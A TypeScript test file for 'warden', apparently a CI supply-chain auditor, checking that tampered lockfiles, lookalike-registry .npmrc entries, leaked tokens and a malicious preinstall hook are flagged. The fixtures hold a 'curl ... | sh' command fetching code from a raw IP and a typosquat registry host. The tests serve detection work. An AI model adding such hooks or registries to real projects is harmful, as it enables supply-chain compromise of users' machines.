import { expect, test } from "bun:test";
import { defaultWardenDeps, runWarden, type WardenDeps } from "../../src/cli/main.ts";
import type { CiFinding } from "../../src/schema.ts";

const HOSTILE_LOCK = JSON.stringify({
  packages: {
    "": {},
    "node_modules/a": { version: "1.0.0", resolved: "https://registry.npmjs.help/a.tgz" },
  },
});

const HOSTILE_MANIFEST = JSON.stringify({
  name: "app",
  scripts: { preinstall: "curl http://185.62.57.1/x | sh" },
  dependencies: {},
});

function makeDeps(changed: string[], files: Record<string, string>) {
  const out: string[] = [];
  const err: string[] = [];
  const written = new Map<string, string>();
  const deps: WardenDeps = {
    ...defaultWardenDeps,
    cwd: () => "/repo",
    check: () => Promise.reject(new Error("no package changed; check must not be called")),
    stdout: (s) => out.push(s),
    stderr: (s) => err.push(s),
    exists: (path) => path in files,
    mkdir: () => undefined,
    writeFile: (path, data) => written.set(path, String(data)),
    glob: () => [],
    readFile: (path) => {
      if (path in files) return files[path] as string;
      throw new Error(`ENOENT ${path}`);
    },
    git: (args) => {
      if (args[0] === "rev-parse") return { exitCode: 0, stdout: "true\n", stderr: "" };
      if (args[0] === "merge-base") return { exitCode: 0, stdout: "abc123def456\n", stderr: "" };
      if (args[0] === "diff" && args[1] === "--name-only")
        return { exitCode: 0, stdout: `${changed.join("\n")}\n`, stderr: "" };
      return { exitCode: 1, stdout: "", stderr: "unexpected git call" };
    },
  };
  return { deps, out, err, written };
}

const findingsFrom = (out: string[]) => JSON.parse(out.join("")) as CiFinding[];

test("a tampered lockfile in the diff fails ci even when no dependency version changed", async () => {
  const { deps, out } = makeDeps(["package-lock.json"], {
    "/repo/package-lock.json": HOSTILE_LOCK,
  });
  expect(await runWarden(["ci", "--reporter", "json"], deps)).toBe(20);
  const findings = findingsFrom(out);
  expect(findings.map((f) => f.rule)).toContain("lockfile_lookalike_registry");
  expect(findings[0]?.verify).toBe("warden ci --reporter agent");
});

test("a malicious preinstall added in the diff fails ci", async () => {
  const { deps, out } = makeDeps(["package.json"], { "/repo/package.json": HOSTILE_MANIFEST });
  expect(await runWarden(["ci", "--reporter", "json"], deps)).toBe(20);
  expect(findingsFrom(out).map((f) => f.rule)).toContain("script_pipes_download_to_shell");
});

test("an npmrc change in the diff is audited", async () => {
  const { deps, out } = makeDeps([".npmrc"], {
    "/repo/.npmrc": "registry=https://registry.npmjs.help/",
  });
  expect(await runWarden(["ci", "--reporter", "json"], deps)).toBe(20);
  expect(findingsFrom(out).map((f) => f.rule)).toContain("config_lookalike_registry");
});

test("surfaces untouched by the diff are not audited", async () => {
  const { deps, out } = makeDeps(["README.md"], {
    "/repo/package-lock.json": HOSTILE_LOCK,
    "/repo/.npmrc": "registry=https://registry.npmjs.help/",
  });
  expect(await runWarden(["ci", "--reporter", "json"], deps)).toBe(0);
  expect(findingsFrom(out)).toEqual([]);
});

test("surface findings are recorded in the agent handoff bundle", async () => {
  const { deps, out, written } = makeDeps(["package-lock.json"], {
    "/repo/package-lock.json": HOSTILE_LOCK,
  });
  expect(await runWarden(["ci", "--reporter", "agent"], deps)).toBe(20);
  const payload = JSON.parse(out.join("")) as { findings: CiFinding[]; verdict: string };
  expect(payload.verdict).toBe("block");
  expect(payload.findings.length).toBeGreaterThan(0);
  const saved = written.get("/repo/.warden/last-run.json");
  expect(saved).toBeDefined();
  expect(JSON.parse(saved as string).findings.length).toBeGreaterThan(0);
});

test("github reporter annotates surface findings with file and line", async () => {
  const { deps, out } = makeDeps([".npmrc"], {
    "/repo/.npmrc": "//registry.npmjs.org/:_authToken=npm_leaked",
  });
  expect(await runWarden(["ci", "--reporter", "github"], deps)).toBe(20);
  const text = out.join("");
  expect(text).toContain("::error file=.npmrc,line=1::");
  expect(text).not.toContain("npm_leaked");
});

test("a nested workspace lockfile also triggers the lockfile audit", async () => {
  const { deps, out } = makeDeps(["packages/ui/package-lock.json"], {
    "/repo/package-lock.json": HOSTILE_LOCK,
  });
  expect(await runWarden(["ci", "--reporter", "json"], deps)).toBe(20);
  expect(findingsFrom(out).length).toBeGreaterThan(0);
});

test("the sarif reporter emits a valid document to stdout", async () => {
  const { deps, out } = makeDeps(["package-lock.json"], {
    "/repo/package-lock.json": HOSTILE_LOCK,
  });
  expect(await runWarden(["ci", "--reporter", "sarif"], deps)).toBe(20);
  const sarif = JSON.parse(out.join(""));
  expect(sarif.version).toBe("2.1.0");
  expect(sarif.runs[0].results.length).toBeGreaterThan(0);
  expect(sarif.runs[0].results[0].level).toBe("error");
});

test("an unknown reporter is rejected", async () => {
  const { deps } = makeDeps(["README.md"], {});
  expect(await runWarden(["ci", "--reporter", "nope"], deps)).toBe(30);
});
